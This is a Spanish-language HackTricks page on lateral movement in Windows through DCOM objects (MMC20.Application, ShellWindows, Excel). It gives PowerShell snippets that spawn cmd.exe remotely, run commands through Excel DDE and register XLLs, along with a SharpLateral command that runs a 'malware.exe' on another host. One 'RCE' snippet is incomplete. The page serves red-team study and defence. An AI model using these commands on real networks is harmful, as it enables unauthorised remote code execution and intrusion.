# DCOM Exec

<details>

<summary><strong>Aprende hacking de AWS desde cero hasta héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? o ¿quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Obtén la [**merch oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Para más información sobre esta técnica, consulta la publicación original en [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Los objetos del Modelo de Objetos Compuestos Distribuidos (DCOM) presentan una capacidad interesante para interacciones basadas en red con objetos. Microsoft proporciona documentación completa tanto para DCOM como para el Modelo de Objetos Compuestos (COM), accesible [aquí para DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) y [aquí para COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Una lista de aplicaciones DCOM se puede recuperar utilizando el comando de PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
El objeto COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permite la automatización de operaciones de complementos MMC. Notablemente, este objeto contiene un método `ExecuteShellCommand` bajo `Document.ActiveView`. Más información sobre este método se puede encontrar [aquí](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Verifíquelo en funcionamiento:

Esta función facilita la ejecución de comandos a través de una red mediante una aplicación DCOM. Para interactuar con DCOM de forma remota como administrador, se puede utilizar PowerShell de la siguiente manera:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Este comando se conecta a la aplicación DCOM y devuelve una instancia del objeto COM. Luego se puede invocar el método ExecuteShellCommand para ejecutar un proceso en el host remoto. El proceso implica los siguientes pasos:

Check methods:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obtener RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Para más información sobre esta técnica, consulta la publicación original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

El objeto **MMC20.Application** fue identificado como carente de "LaunchPermissions" explícitos, por defecto a permisos que permiten el acceso a Administradores. Para más detalles, se puede explorar un hilo [aquí](https://twitter.com/tiraniddo/status/817532039771525120), y se recomienda el uso de [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET para filtrar objetos sin Permiso de Lanzamiento explícito.

Dos objetos específicos, `ShellBrowserWindow` y `ShellWindows`, fueron destacados debido a su falta de Permisos de Lanzamiento explícitos. La ausencia de una entrada de registro `LaunchPermission` bajo `HKCR:\AppID\{guid}` significa que no hay permisos explícitos.

###  ShellWindows
Para `ShellWindows`, que carece de un ProgID, los métodos .NET `Type.GetTypeFromCLSID` y `Activator.CreateInstance` facilitan la instanciación del objeto utilizando su AppID. Este proceso aprovecha OleView .NET para recuperar el CLSID de `ShellWindows`. Una vez instanciado, la interacción es posible a través del método `WindowsShell.Item`, lo que lleva a la invocación de métodos como `Document.Application.ShellExecute`.

Se proporcionaron ejemplos de comandos de PowerShell para instanciar el objeto y ejecutar comandos de forma remota:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Movimiento Lateral con Objetos DCOM de Excel

El movimiento lateral se puede lograr explotando objetos DCOM de Excel. Para obtener información detallada, se recomienda leer la discusión sobre el aprovechamiento de Excel DDE para el movimiento lateral a través de DCOM en [el blog de Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

El proyecto Empire proporciona un script de PowerShell, que demuestra la utilización de Excel para la ejecución remota de código (RCE) manipulando objetos DCOM. A continuación se presentan fragmentos del script disponible en [el repositorio de GitHub de Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), mostrando diferentes métodos para abusar de Excel para RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Herramientas de Automatización para Movimiento Lateral

Se destacan dos herramientas para automatizar estas técnicas:

- **Invoke-DCOM.ps1**: Un script de PowerShell proporcionado por el proyecto Empire que simplifica la invocación de diferentes métodos para ejecutar código en máquinas remotas. Este script es accesible en el repositorio de GitHub de Empire.

- **SharpLateral**: Una herramienta diseñada para ejecutar código de forma remota, que se puede utilizar con el comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Herramientas Automáticas

* El script de Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) permite invocar fácilmente todas las formas comentadas de ejecutar código en otras máquinas.
* También podrías usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referencias

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
